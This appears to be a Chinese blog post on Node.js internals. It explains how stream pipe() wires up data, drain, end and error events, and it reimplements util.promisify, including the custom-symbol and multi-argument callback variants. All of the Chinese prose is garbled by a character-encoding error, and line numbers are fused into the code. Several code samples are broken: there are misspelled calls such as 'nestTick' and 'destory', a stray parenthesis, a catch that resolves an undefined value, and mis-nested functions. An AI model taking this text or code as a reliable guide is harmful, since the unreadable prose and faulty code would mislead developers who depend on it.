åœ¨StreamåŽŸåž‹ä¸Šå£°æ˜Žpipeæ–¹æ³•ï¼Œè®¢é˜…dataäº‹ä»¶ï¼Œsrcä¸ºå¯è¯»å¯¹è±¡ï¼Œdestä¸ºå¯å†™æµå¯¹è±¡ã€‚åœ¨ä½¿ç”¨pipeæ–¹æ³•çš„æ—¶å€™ä¹Ÿæ˜¯ç›‘å¬çš„dataäº‹ä»¶ï¼Œä¸€è¾¹è¯»å–ä¸€è¾¹å†™å…¥æ•°æ®ã€‚ ondataæ–¹æ³•çš„å‡ ä¸ªæ ¸å¿ƒçš„å®žçŽ°ï¼š dest.write(chunk):æŽ¥å—chunkå†™å…¥æ•°æ®ï¼Œå¦‚æžœå†…éƒ¨çš„ç¼“å†²å°äºŽåˆ›å»ºæµæ—¶é…ç½®çš„highWaterMarkï¼Œåˆ™è¿”å›žtrueï¼ˆç¼“å­˜æœªæ»¡ï¼‰,å¦åˆ™è¿”å›žfalseæ—¶åº”è¯¥åœæ­¢å‘æµå†™å…¥æ•°æ®ï¼Œç›´åˆ°â€˜drainâ€™ï¼ˆæ¸…ç©ºç¼“å­˜ï¼‰äº‹ä»¶è¢«è§¦å‘ src.pause()ï¼šå¯è¯»æµä¼šåœæ­¢dataäº‹ä»¶ï¼Œæ„å‘³ç€æ­¤æ—¶æš‚åœæ•°æ®å†™å…¥äº† è°ƒç”¨src.pauseæ˜¯ä¸ºäº†é˜²æ­¢è¯»å…¥æ•°æ®è¿‡å¿«æ¥ä¸åŠå†™å…¥ï¼Œå¦‚æžœç¼“å­˜æœªæ»¡å³dest.write(chunk)ï¼Œè¿™ä¸ªç¼“å­˜æ˜¯æ ¹æ®åˆ›å»ºæµæ—¶åˆ›å»ºçš„highWaterMarkå±žæ€§ï¼Œé»˜è®¤ä¸º16384ï¼ˆ16kï¼‰ï¼Œå¯¹è±¡æ¨¡å¼çš„æµé»˜è®¤ä¸º16 1234567891011Readable.prototype.pipe = function(dest,options)&#123; const src = this; src.on('data',ondata); function ondata()&#123; const ret = dest.write(chunk); if(ret === false)&#123; ... src.pause(); &#125; &#125;&#125; 3.è®¢é˜…drainäº‹ä»¶ï¼Œç»§ç»­æµåŠ¨æ•°æ®ã€‚ç»§ç»­å†™å…¥äº‹ä»¶åˆ°æµæ—¶ä¼šè§¦å‘drainäº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯dest.write(chunk)ç­‰äºŽfalse(ç¼“å­˜æ»¡äº†)æ—¶ï¼Œå¦‚æžœondrainä¸å­˜åœ¨åˆ™æ³¨å†Œdrainäº‹ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940Readable.prototype.pipe = function(dest,options)&#123; const src = this; src.on('data',ondata); function ondata()&#123; const ret = dest.write(chunk); if(ret === false)&#123; ... if(!ondrain)&#123; // When the dest drains, it reduces the awaitDrain counter // on the source. This would be more elegant with a .once() // handler in flow(), but adding and removing repeatedly is // too slow. ondrain = pipeOnDrain(src); dest.on('drain',ondrain); &#125; src.pause(); &#125; &#125; // å½“å†™å…¥æµdestè€—å°½æ—¶ï¼Œå®ƒå°†ä¼šåœ¨å¯è¯»æµå¯¹è±¡ sourceä¸Šå‡å°‘ awaitDrainè®¡æ•°å™¨ï¼Œä¸ºäº†ç¡®ä¿æ‰€æœ‰éœ€è¦ç¼“å­˜çš„å†™å…¥éƒ½å®Œæˆï¼Œå³state.awaitDrain === 0å’Œsrcå¯è¯»æµä¸Šçš„dataäº‹ä»¶å­˜åœ¨ï¼Œåˆ‡æ¢æµåˆ°æµåŠ¨æ¨¡å¼ function pipeOnDrain(src)&#123; return function pipeDrainFunctionResult()&#123; const state = src._readableState; debug('pipeOnDrain',state.awaitDrain); if(state.awaitDrain)&#123; state.awaitDrain--; &#125; if(state.awaitDrain ===0 &amp;&amp; EE.listenerCount(src,'data'))&#123; state.flowing = true; flow(src) &#125; &#125; &#125; // Stream.read() ä»Žå†…éƒ¨ç¼“å­˜æ‹‰å–å¹¶è¿”å›žæ•°æ®ï¼Œå¦‚æžœæ²¡æœ‰å¯è¯»çš„æ•°æ®ï¼Œåˆ™è¿”å›žnullï¼Œåœ¨å¯è¯»æµä¸Šsrcè¿˜æœ‰ä¸€ä¸ªreadableå±žæ€§ï¼Œå¦‚æžœå¯ä»¥å®‰å…¨åœ°è°ƒç”¨readable,read(),åˆ™ä¸ºtrue function slow(stream)&#123; const state = stream._readableState; debug('flow',state.flowing); while(state.flowing &amp;&amp; stream.read() !== null) &#125;&#125; 4.è§¦å‘dataäº‹ä»¶ã€‚è°ƒç”¨readableçš„resumeæ–¹æ³•ï¼Œè§¦å‘å¯è¯»æµçš„dataäº‹ä»¶ï¼Œè¿›å…¥æµåŠ¨æ¨¡å¼ 12345678Readable.prototype.pipe = function(dest,options)&#123; const src = this; // start the flow if it hasnot been started already. if(!state.flowing)&#123; debug('pipe resume') src.resume(); &#125;&#125; resumeæ–¹æ³•å†…éƒ¨åˆè°ƒç”¨resume_()ï¼Œæœ€ç»ˆæ‰§è¡Œäº†stream.read(0)è¯»å–äº†ä¸€æ¬¡ç©ºæ•°æ®ï¼ˆsizeè®¾ç½®ä¸º0ï¼‰ï¼Œå°†ä¼šè§¦å‘å®žä¾‹ä¸Šçš„_read()æ–¹æ³•ï¼Œå†è§¦å‘dataäº‹ä»¶ã€‚ 12345678910function resume(stream,state)&#123; process.nextTick(resume_,stream,state)&#125;function resume_(stream,state)&#123; debug('resume',state.reading); if(!state.reading)&#123; stream.read(0); &#125;&#125; 5.è®¢é˜…endäº‹ä»¶ endäº‹ä»¶ï¼šå½“å¯è¯»æµä¸­æ²¡æœ‰æ•°æ®å¯ä¾›æ¶ˆè´¹æ—¶è§¦å‘ï¼Œè°ƒç”¨onendå‡½æ•°ï¼Œæ‰§è¡Œdest.end()æ–¹æ³•ï¼Œè¡¨æ˜Žå·²æ²¡æœ‰æ•°æ®è¦è¢«å†™å…¥å¯å†™æµï¼Œè¿›è¡Œå…³é—­ï¼ˆå…³é—­å¯å†™æµçš„idï¼‰,ä¹‹åŽå†è°ƒç”¨stream.writeä¼šå¯¼è‡´é”™è¯¯ã€‚ 12345678910111213141516Readable.prototype.pipe = function(dest,options)&#123; const doEnd = (!pipeOpts || pipeOpts.end !== false) &amp;&amp; dest !== process.stdout &amp;&amp; dest !== process.stderr; const endFn = doEnd?onend:unpipe; if(state.endEmitted)&#123; process.nestTick(endFn) &#125;else&#123; src.once('end',endFn) &#125; dest.on('unpipe',onunpipe) function onend()&#123; debug('onend'); dest.end(); &#125;&#125; 6.è§¦å‘pipeäº‹ä»¶ï¼Œä¼ å…¥å¯è¯»æµå¯¹è±¡ 1234Readable.prototype.pipe = function(dest,options)&#123; const source = this; dest.emit('pipe',src);&#125; åœ¨åº”ç”¨å±‚ä½¿ç”¨ä½†çš„æ—¶å€™å¯ä»¥åœ¨å¯å†™æµä¸Šè®¢é˜…pipeäº‹ä»¶ï¼Œåšä¸€äº›åˆ¤æ–­ã€‚ 7.æ”¯æŒé“¾å¼è°ƒç”¨ï¼Œæœ€åŽè¿”å›ždest 123Stream.protptype.pipe = function(dest,options)&#123; return dest;&#125; /lib/internal/streams/legacy.jsæ¨¡å—å®žçŽ°åˆ†æžå£°æ˜Žæž„é€ å‡½æ•°Streamå£°æ˜Žæž„é€ å‡½æ•°Streamç»§æ‰¿äºŽäº‹ä»¶events,æ­¤æ—¶å°±æ‹¥æœ‰äº†eventsåœ¨åŽŸåž‹å®šä¹‰çš„å±žæ€§ï¼Œä¾‹å¦‚on/emitç­‰æ–¹æ³• 123456789const &#123;ObjectSetPrototypeOf&#125; = primordials;const EE = require('events');function Stream(opts)&#123; EE.call(this,opts)&#125;ObjectSetPrototypeOf(Stream.prototype,EE.prototype);ObjectSetPrototypeOf(Stream,EE) å£°æ˜Žpipeæ–¹æ³•ï¼Œè®¢é˜…dataäº‹ä»¶åœ¨StreamåŽŸåž‹ä¸Šå£°æ˜Žpipeæ–¹æ³•ï¼Œè®¢é˜…dataäº‹ä»¶ï¼Œsourceä¸ºå¯è¯»æµå¯¹è±¡ï¼Œdestä¸ºå¯å†™æµå¯¹è±¡ åœ¨ä½¿ç”¨pipeæ–¹æ³•çš„æ—¶å€™ä¹Ÿæ˜¯ç›‘å¬çš„dataäº‹ä»¶ï¼Œä¸€è¾¹è¯»å–æ•°æ®ä¸€è¾¹å†™å…¥æ•°æ® ondataæ–¹æ³•çš„å‡ ä¸ªAPIï¼š dest.writableï¼šå¦‚æžœè°ƒç”¨writable.write()æ˜¯å®‰å…¨çš„ï¼Œåˆ™ä¸ºtrue dest.write(chunk)ï¼šæŽ¥æ”¶chunkå†™å…¥æ•°æ®ï¼Œå¦‚æžœå†…éƒ¨çš„ç¼“å†²å°äºŽå†…éƒ¨åˆ›å»ºæµæ—¶é…ç½®çš„highWaterMarkï¼Œåˆ™è¿”å›žtrue,å¦åˆ™è¿”å›žfalseæ—¶åº”è¯¥åœæ­¢å‘æµå†™å…¥æ•°æ®ï¼ŒçŸ¥é“drainäº‹ä»¶è¢«è§¦å‘ã€‚ source.pause()ï¼šå¯è¯»æµä¼šåœæ­¢dataäº‹ä»¶ï¼Œæ„å‘³ç€æ­¤æ—¶æš‚åœæ•°æ®å†™å…¥äº† 123456789Stream.prototype.pipe = function(dest,options)&#123; const source = this; function ondata(chunk)&#123; if(dest.writable &amp;&amp; dest.write(chunk) === false &amp;&amp; source.pause)&#123; source.pause(); &#125; &#125; source.on('data',ondata)&#125; è®¢é˜…drainäº‹ä»¶å¦‚æžœè°ƒç”¨dest.write(chunk)è¿”å›žfalse,å°±ä¼šè°ƒç”¨source.pause()åœæ­¢æ•°æ®æµåŠ¨ï¼Œç»§ç»­å†™å…¥äº‹ä»¶åˆ°æµæ—¶ä¼šè§¦å‘drainäº‹ä»¶ï¼Œondrainæ–¹æ³•çš„å‡ ä¸ªAPIï¼š source.readableï¼šå¦‚æžœå¯ä»¥å®‰å…¨åœ°è°ƒç”¨readable.read()ï¼Œåˆ™ä¸ºtrue,ä¾‹å¦‚æ•°æ®æœªè¯»åˆ°æœ«å°¾ï¼Œåˆ™ä¼šè¿”å›žtrueï¼Œè¡¨ç¤ºå¯è¯»çš„ã€‚ source.resume()ï¼šå°†è¢«æš‚åœçš„å¯è¯»æµæ¢å¤è§¦å‘dataäº‹ä»¶ï¼Œå¹¶å°†æµåˆ‡æ¢æµåŠ¨æ¨¡å¼ 12345678Stream.prototype.pipe = function(dest,options)&#123; function ondrain()&#123; if(source.readable &amp;&amp; source.resume)&#123; source.resume(); &#125; &#125; dest.on('drain',ondrain)&#125; é€‰é¡¹æŒ‡å®šendå±žæ€§ï¼Œè®¢é˜…end,closeäº‹ä»¶1234567891011121314151617181920212223242526// å¦‚æžœendé€‰é¡¹æ²¡æœ‰è¢«æä¾›ï¼Œå¯è¯»æµè®¢é˜…endæˆ–è€…closeäº‹ä»¶ï¼ŒåŽç»­å°†ä¼šè§¦å‘è¯¥äº‹ä»¶ï¼ŒæŒ‡å®šdest.endæ–¹æ³•ï¼Œä»…è¢«è°ƒç”¨ä¸€æ¬¡ï¼ŒdidOnEndå˜é‡åšäº†æŽ§åˆ¶ï¼Œä¸»è¦æ˜¯ä¸ºäº†å…³é—­å¯å†™æµçš„id// close:å½“æµæˆ–è€…åº•å±‚èµ„æºï¼ˆæ¯”å¦‚æ–‡ä»¶æè¿°ç¬¦ï¼‰è¢«å…³é—­æ—¶è§¦å‘closeäº‹ä»¶// end: å½“å¯è¯»æµä¸­æ²¡æœ‰æ•°æ®å¯ä¾›æ¶ˆè´¹çš„æ—¶å€™è§¦å‘// å¯è¯»æµçš„end,destroyæ–¹æ³•// dest.end() è¡¨æ˜Žå·²ç»æ²¡æœ‰æ•°æ®è¦è¢«å†™å…¥å¯å†™æµï¼Œè¿›è¡Œå…³é—­ï¼Œä¹‹åŽå†è°ƒç”¨stream.writeä¼šå¯¼è‡´é”™è¯¯// dest.destory() é”€æ¯æµStream.prototype.pipe = function(dest,options)&#123; if(!dest._isStdio &amp;&amp; (!options || options.end !== false))&#123; source.on('end',onend); source.on('close',onclose); &#125; let didOnEnd = false; function onend()&#123; if(didOnEnd) return; didOnEnd = true; dest.end(); &#125; function onclose()&#123; if(didOnEnd) return; didOnEnd = true; if(typeof dest.destory === 'function')&#123; dest.destroy(); &#125; &#125;&#125; è®¢é˜…å¯è¯»æµä¸Žå¯å†™æµçš„erroräº‹ä»¶å¯è¯»æµã€å¯å†™æµå‘ç”Ÿé”™è¯¯æ—¶è§¦å‘erroräº‹ä»¶ï¼Œè°ƒç”¨onerroræ–¹æ³•ï¼Œé¦–å…ˆç§»é™¤å¯è¯»æµï¼Œå¯å†™æµè®¢é˜…çš„æ‰€æœ‰äº‹ä»¶ 123456789101112131415161718192021222324252627Stream.prototype.pipe = function()&#123; function onerror(er)&#123; cleanup(); if(EE.listenerCount(this,'error') == 0)&#123; throw er; &#125; &#125; source.on('error',onerror); dest.on('error',onerror); function cleanup()&#123; source.removeListener('data',ondata); dest.removeListener('drain',ondrain); source.removeListener('end',onend); source.removelistener('close',onclose); source.removeListener('error',onerror); dest.removelistener('error',onerror); source.removeListener('end',cleanup); source.removelistener('close',cleanup); dest.removelistener('close',cleanup); &#125;&#125; è§¦å‘pipeäº‹ä»¶åœ¨pipeæ–¹æ³•é‡Œé¢æœ€åŽè¿˜ä¼šè§¦å‘ä¸€ä¸ªpipeäº‹ä»¶ï¼Œä¼ å…¥å¯è¯»æµå¯¹è±¡ 1234Stream.prototype.pipe = function(dest,options)&#123; const source = this; dest.emit('pipe',source);&#125; æ”¯æŒé“¾å¼è°ƒç”¨æœ€åŽè¿”å›ždest,æ”¯æŒA.pipe(B).pipe(c)çš„å†™æ³•ï¼š 123Stream.prototype.pipe = function(dest,options)&#123; return dest;&#125; util.promisifyå¦‚ä½•å°†Callbackè½¬æ¢ä¸ºPromiseutilæ¨¡å—æä¾›äº†å¾ˆå¤šå·¥å…·å‡½æ•°ï¼Œå…¶ä¸­promisifyæ–¹æ³•å¯ä»¥å°†callbackè½¬æ¢ä¸ºPromiseå¯¹è±¡ï¼Œè§£å†³å›žè°ƒåœ°ç‹±çš„é—®é¢˜ã€‚ ç®€å•å®žçŽ°ç‰ˆæœ¬util promisifyåŸºæœ¬ä½¿ç”¨å°†callbackè½¬ä¸ºpromiseå¯¹è±¡ï¼Œé¦–å…ˆç¡®ä¿è¿™ä¸ªcallbackä¸ºä¸€ä¸ªé”™è¯¯ä¼˜å…ˆçš„å›žè°ƒå‡½æ•°ï¼Œå³(err,value)=&gt;erræŒ‡å®šä¸€ä¸ªé”™è¯¯å‚æ•°ï¼Œvalueä¸ºè¿”å›žå€¼ 123456789101112131415// åˆ›å»ºä¸€ä¸ªtext.txtæ–‡ä»¶ï¼Œå†™å…¥ä¸€äº›è‡ªå®šä¹‰å†…å®¹ï¼Œä½¿ç”¨fs.readFileæ¥è¯»å–è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæµ‹è¯•// ä¼ ç»Ÿçš„Callbackå†™æ³•const util = require('util');fs.readFile('text.txt','utf8',(err,result)=&gt;&#123; console.log('Error',err); console.log('Result: ',result)&#125;)// Promiseå†™æ³•const &#123;promisify&#125; = require('util');const readFilePromisify = util.promisify(fs.readFile); // è½¬æ¢ä¸ºPromisereadFilePromisify('text.txt','utf8') .then(result=&gt;console.log(result)) .catch(err=&gt;console.log(err)) è‡ªå®šä¹‰mayJunPromisifyå‡½æ•°å®žçŽ° è‡ªå®šä¹‰mayJunPromisifyå‡½æ•°å®žçŽ°callbackè½¬æ¢ä¸ºpromiseï¼Œæ ¸å¿ƒå®žçŽ°å¦‚ä¸‹ï¼š æ ¡éªŒä¼ å…¥çš„å‚æ•°originalæ˜¯å¦ä¸ºFunction,ä¸æ˜¯åˆ™æŠ›é”™ promisify(fs.readFile)æ‰§è¡Œä¹‹åŽä¼šè¿”å›žä¸€ä¸ªå‡½æ•°fn,å®šä¹‰å¾…è¿”å›žçš„å‡½æ•°åŽè¿”å›ž fnè¿”å›žçš„æ˜¯ä¸€ä¸ªPromiseå¯¹è±¡ï¼Œåœ¨è¿”å›žçš„Promiseå¯¹è±¡ä¸­æ‰§è¡Œcallbackå‡½æ•° 12345678910111213141516171819202122function mayJunPromisify(original)&#123; if(typeof original !== 'function')&#123; throw new Error('The "original" argument must be of type Function,Received type undefined') &#125; function fn(...args)&#123; return new Promise((resolve,reject)=&gt;&#123; try&#123; original.call(this,...args,(err,result)=&gt;&#123; if(err)&#123; reject(err) &#125;else&#123; resolve(result) &#125; &#125;) &#125;catch(err)&#123; resolve(result) &#125; &#125;) &#125; return fn;&#125; util.promisify.customåŸºæœ¬ä½¿ç”¨å¦ä¸€ä¸ªåŠŸèƒ½æ˜¯å¯ä»¥ä½¿ç”¨util.promise.customç¬¦å·é‡å†™util.promisifyè¿”å›žå€¼ã€‚ åœ¨fs.readFileä¸Šå®šä¹‰util.promisify.customç¬¦å·ï¼Œå…¶åŠŸèƒ½ä¸ºç¦æ­¢è¯»å–æ–‡ä»¶ 123456789// æ³¨æ„é¡ºåºè¦åœ¨ util.promisifyä¹‹å‰fs.readFile[util.promisify.custom] = ()=&gt;&#123; return Promise.reject('è¯¥æ–‡ä»¶æš‚æ—¶ç¦æ­¢è¯»å–')&#125;const readFilePromisify = util.promisify(fs.readFile);readFilePromisify('text.txt','utf8') .then(result=&gt;console.log(result)) .catch(err=&gt;console.log(err)) // è¯¥æ–‡ä»¶æš‚æ—¶ç¦æ­¢è¯»å– è‡ªå®šä¹‰mayJunPromisify.customå®žçŽ° å®šä¹‰ä¸€ä¸ªSymbolå˜é‡kCustomPromisifiedSymbolèµ‹äºˆmayJunPromisify.custom æ ¡éªŒæ˜¯å¦æœ‰è‡ªå®šä¹‰çš„promiseå‡½æ•° è‡ªå®šä¹‰çš„mayJunPromisified.customä¹Ÿè¦ä¿è¯æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå¦åˆ™æŠ›é”™ ç›´æŽ¥è¿”å›žè‡ªå®šä¹‰çš„mayJunPromisify.customå‡½æ•°ï¼ŒåŽç»­çš„fnå‡½æ•°å°±ä¸ä¼šæ‰§è¡Œäº†ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œé‡å†™util.promisifyè¿”å›žå€¼ 12345678910111213141516171819202122232425// æ‰€ä»¥è¯´util.promisify.customæ˜¯ä¸€ä¸ªç¬¦å·const kCustomPromisifiedSymbol = Symbol('util,promisify.custom');mayJunPromisify.custom = kCustomPromisifiedSymbol;function mayJunPromisify(original)&#123; if(typeof original !== 'function')&#123; throw new Error('The "original" argument must be of type Function,Received type undefined') &#125; if(original[kCustomPromisifiedSymbol])&#123; const fn = original[kCustomPromisifiedSymbol]; if(typeof fn !== 'function')&#123; throw new Error('The "mayJunPromise.custom" property must be of the type Function,Received type number') &#125; return Object.defineProperty(fn,kCustomPromisifiedSymbol,&#123; value:fn, enumerable:false, writable:false, configurable:true &#125;) &#125; function fn(...args)&#123;&#125; return fn;&#125; util.promisifyå›žè°ƒå‡½æ•°å¤šå‚è½¬æ¢æœ‰äº›å‡½æ•°çš„å›žè°ƒå½¢å¼æ˜¯å¤šä¸ªå‚æ•°çš„ï¼Œä¾‹å¦‚dns.lookupï¼Œå®ƒçš„å›žè°ƒå½¢å¼æ˜¯(err,address,family)=&gt;...æ‹¥æœ‰ ä¸‰ä¸ªå‚æ•°ï¼Œå¯¹è¿™ç§æƒ…å†µä¹Ÿåšå…¼å®¹ åŸºæœ¬ä½¿ç”¨ï¼š 1234567const dns = require('dns');const lookupPromisify = util.promisify(dns.lookup);lookupPromisify('laibh.top') .then((&#123;address,family&#125;)=&gt;&#123; console.log('åœ°å€ï¼š',address,'åœ°å€æ—ï¼š',family)&#125;).catch(err=&gt;console.log(err)) å®žçŽ°è§£æžï¼š ä¸ºäº†æ”¯æŒutil.promisifyä¹Ÿéƒ½ä¼šåœ¨å‡½æ•°ä¸Šå®šä¹‰ä¸€ä¸ªcustomPromisifyArgså‚æ•°ï¼Œvalueä¸ºå›žè°ƒçš„å¤šä¸ªå‚æ•°çš„åç§°ï¼Œç±»åž‹ä¸ºæ•°ç»„ï¼Œä¾‹å¦‚dns.lookupç»‘å®šçš„customPromisifyArgsçš„valueä¸º[&#39;address&#39;,&#39;family&#39;]ï¼Œå…¶ä¸»è¦ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†é€‚é…util.promisify dns.lookupæ”¯æŒutil.promisifyæ ¸å¿ƒå®žçŽ° 123456const &#123;customPromisifyArgs&#125; = require('internal/util');ObjectDefineProperty(lookup,customPromisifyArgs,&#123; value:['address','family'], enumerable:false&#125;) customPromisifyArgsè¿™ä¸ªå‚æ•°æ˜¯ä»Žinternal/utilæ¨¡å—å¯¼å‡ºçš„ï¼Œä»…å†…éƒ¨è°ƒç”¨ï¼Œåœ¨å¤–éƒ¨util.promisifyæ˜¯æ²¡æœ‰è¿™ä¸ªå‚æ•°çš„ã€‚ä¹Ÿå°±æ„å‘³ç€åªæœ‰Nodeæ¨¡å—ä¸­ä¾‹å¦‚dns.lookupã€fs.readç­‰æ–¹æ³•åœ¨å¤šå‚æ•°çš„æ—¶å€™å¯ä»¥ä½¿ç”¨util.promisifyè½¬æ¢ä¸ºPromiseï¼Œå¦‚æžœè‡ªå®šä¹‰çš„callbackå­˜åœ¨å¤šå‚æ•°çš„æƒ…å†µï¼Œä½¿ç”¨util.promisifyåˆ™ä¸è¡Œï¼Œä¸è¿‡å¯ä»¥åŸºäºŽutil.promisifyè‡ªå·±å°è£…ä¸€ä¸ªï¼š 1234module.exports = &#123; // Symbol used to customize promisify conversion customPromisifyArgs:kCustomPromisifyArgsSymbol&#125; å®šä¹‰Symbolå˜é‡kCustomPromisifyArgsSymbol èŽ·å–å‚æ•°åç§°åˆ—è¡¨ (err,result)æ”¹ä¸º(err,...values),åŽŸå…ˆçš„resultä»…æŽ¥å—ä¸€ä¸ªå‚æ•°ï¼Œæ”¹ä¸º...valuesæŽ¥æ”¶å¤šä¸ªå‚æ•° argumentNameså­˜åœ¨ä¸”value&gt;1,åˆ™å›žè°ƒä¼šå­˜åœ¨å¤šä¸ªå‚æ•°åç§°ï¼Œç»å¸¸éåŽ†ï¼Œè¿”å›žä¸€ä¸ªobj å¦åˆ™valuesæœ€å¤šä»…æœ‰ä¸€ä¸ªå‚æ•°åç§°ï¼Œå³æ•°ç»„valuesæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå…ƒç´  123456789101112131415161718192021222324252627282930const kCustomPromisifyArgsSymbol = Symbol('customPromisifyArgs');function promisify(original)&#123; // èŽ·å–å¤šä¸ªå›žè°ƒå‡½æ•°çš„å‡½æ•°å‚æ•°åˆ—è¡¨ const argumentName = original[kCustomPromisifyArgsSymbol]; function fn(..args)&#123; return new Promise((resolve,reject)=&gt;&#123; try&#123; original.call(this,...args,(err,...values)=&gt;&#123; if(err)&#123; reject(err) &#125;else&#123; // argumentNameså­˜åœ¨ä¸”values&gt;1,åˆ™å›žè°ƒä¼šå­˜åœ¨å¤šä¸ªå‚æ•°åç§°ï¼Œè¿›è¡ŒéåŽ†ï¼Œè¿”å›žä¸€ä¸ªobj if(argumentNames !== undefined &amp;&amp; values.length &gt; 1)&#123; const obj = &#123;&#125;; for(let i=0;i&lt;argumentNames.length;i+=1)&#123; obj[argumentNames[i]] = values[i]; resolve(obj) &#125; &#125;else&#123; // å¦åˆ™valuesæœ€å¤šåªæœ‰ä¸€ä¸ªå‚æ•°åç§°ï¼Œå³æ•°ç»„valuesæœ‰ä¸”åªæœ‰ä¸€ä¸ªå…ƒç´  resolve(values[0]) &#125; &#125; &#125;) &#125; &#125;) &#125; return fn;&#125; å®Œæ•´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// ç”±äºŽkCustomPromiseArgsSymbolä½¿ç”¨Symbolå£°æ˜Žï¼ˆæ¯æ¬¡é‡æ–°å®šä¹‰éƒ½ä¼šä¸ä¸€æ ·ï¼‰ï¼Œä¸”æ²¡æœ‰å¯¹å¤–æä¾›ã€‚è¦å®žçŽ°è¿™ä¸ªåŠŸèƒ½ï¼Œéœ€è¦æ¯æ¬¡åœ¨cbé‡æ–°å®šä¹‰kCustomPromisifyArgsSymbolå±žæ€§const kCustomPromisifiedSymbol = Symbol('util.promisify.custom');const kCustomPromisifyArgsSymbol = Symbol('customPromisifyArgs');mayJunPromisify.custom = kCustomPromisifiedSymbol;function mayJunPromisify(original)&#123; if(typeof original !== 'function')&#123; throw new Error('The "original" argument must be of type Function,Received type undefined') &#125; if(original[kCustomPromisifiesSymbol])&#123; const fn = original[kCustomPromisifiesSymbol]; if(typeof fn !== 'function')&#123; throw new Error('The "util.promisify.custom" property must be of type Function.Received type number') &#125; return Object.defineProperty(fn,kCustomPromisifiedSymbol,&#123; value:fn, enumerable:false, writable:false, configurable:true &#125;) // èŽ·å–å¤šä¸ªå›žè°ƒå‡½æ•°çš„å‚æ•°åˆ—è¡¨ const argumentNames = original[kCustomPromisifyArgsSymbol]; function fn(...args)&#123; return new Promise((resolve,reject)=&gt;&#123; try&#123; original.call(this,...args,(err,...values)=&gt;&#123; if(err)&#123; reject)(err); &#125;else&#123; // argumentName å­˜åœ¨ä¸” values&gt;1,åˆ™å›žè°ƒä¼šå­˜åœ¨å¤šä¸ªå‚æ•°åç§°ï¼Œè¿›è¡ŒéåŽ†ï¼Œè¿”å›žä¸€ä¸ªobj if(argumentNames !== undefined &amp;&amp; values.length &gt; 1)&#123; const obj = &#123;&#125;; for(let i=0;i&lt;argumentNames.length;i+=1)&#123; obj[argumentNames[i]] = values[i] resolve(obj) &#125; &#125;else&#123; // å¦åˆ™valuesæœ€å¤šä»…æœ‰ä¸€ä¸ªå‚æ•°åç§°ï¼Œå³æ•°ç»„valuesæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå…ƒç´  resolve(values[0]) &#125; &#125; &#125;) &#125;catch(err)&#123; reject(err) &#125; &#125;) &#125; &#125;&#125;module.exports = &#123; mayJunPromisify, kCustomPromisifyArgsSymbol&#125; ä½¿ç”¨ï¼š 12345678910111213141516171819202122232425262728293031323334353637const &#123;kCustomPromisifyArgsSymbol,mayJunPromisify&#125; = require('./may-jun-promisify');const fs = require('fs');// mayJunPromisify.customè‡ªå®šä¹‰Promiseå‡½æ•°æµ‹è¯•function promisifyCustomTest()&#123; fs.readFile[mayJunPromisify.custom]=()=&gt;&#123; return Promise.reject('è¯¥æ–‡ä»¶æš‚æ—¶ç¦æ­¢è¯»å–') &#125; const readFilePromisify = mayJunPromisify(fs.readFile); readFilePromisify('text.txt','utf8') .then(result=&gt;console.log(result)) .catch(err=&gt;console.log(err)))&#125;// è‡ªå®šä¹‰cbå¤šå‚æ•°è½¬æ¢promisefunction cbConverPromiseTest()&#123; function getUserById(id,cb)&#123; const name = 'laibh', age = 25; cb(null,name,age); &#125; Object.defineProperty(getUserById,kCustomPromisifyArgsSymbol,&#123; value:['name','age'], enumerable:false &#125;) const getUserByIdPromisify = mayJunPromisify(getUserById); getUserByIdPromisify(1) .then(&#123;name,age&#125;=&gt;&#123; console.log(name,age); &#125;) .catch(err=&gt;console.log(err)) &#125;promisifyCustomTest();cbConverPromiseTest(); I/OI/Oå³Input/Outputï¼Œè¾“å…¥è¾“å‡ºç«¯å£ï¼Œæ˜¯ä¿¡æ¯å¤„ç†ç³»ç»Ÿä¸Žå¤–éƒ¨ä¸–ç•Œä¹‹é—´çš„é€šä¿¡ï¼Œè¾“å…¥æ‰‹æ˜¯ç³»ç»ŸæŽ¥æ”¶çš„ä¿¡å·æˆ–æ•°æ®ï¼Œè¾“å‡ºçš„åˆ™æ˜¯ä»Žå…¶å‘é€çš„ä¿¡å·æˆ–æ•°æ® ä¸€æ¬¡I/Oæ“ä½œåˆ†ä¸ºç­‰å¾…èµ„æºï¼Œä½¿ç”¨èµ„æºä¸¤ä¸ªé˜¶æ®µï¼Œå¸¸è§çš„è¯ç½‘ç»œI/O,ç£ç›˜I/O é˜»å¡žä¸Žéžé˜»å¡žI/Oæ˜¯å¯¹äºŽæ“ä½œç³»ç»Ÿå†…æ ¸è€Œè¨€çš„ï¼Œå‘ç”Ÿåœ¨ç­‰å¾…èµ„æºé˜¶æ®µï¼Œæ ¹æ®å‘èµ·çš„I/Oè¯·æ±‚æ˜¯å¦é˜»å¡žæ¥åˆ¤æ–­ é˜»å¡žI/Oï¼šè¿™ç§æ¨¡å¼ä¸‹ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹åœ¨å‘èµ·ä¸€ä¸ªI/Oæ“ä½œä¹‹åŽï¼Œåªæœ‰æŽ¥æ”¶åˆ°å“åº”æˆ–è€…è¶…æ—¶æ—¶æ‰å¯è¿›è¡Œå¤„ç†å…¶ä»–äº‹æƒ…ï¼Œå¦åˆ™I/Oå°†ä¼šä¸€ç›´é˜»å¡žã€‚ä»¥è¯»å–ç£ç›˜ä¸Šçš„ä¸€æ®µæ–‡ä»¶ä¸ºä¾‹å­ï¼Œç³»ç»Ÿå†…æ ¸åœ¨å®Œæˆç£ç›˜å¯»é“ã€è¯»å–æ•°æ®ã€å¤åˆ¶æ•°æ®åˆ°å†…å­˜ä¹‹ä¸­ä¹‹åŽï¼Œè¿™ä¸ªè°ƒç”¨æ‰ç®—å®Œæˆã€‚é˜»å¡žçš„è¿™æ®µæ—¶é—´å¯¹CPUèµ„æºæ˜¯æµªè´¹çš„ã€‚ 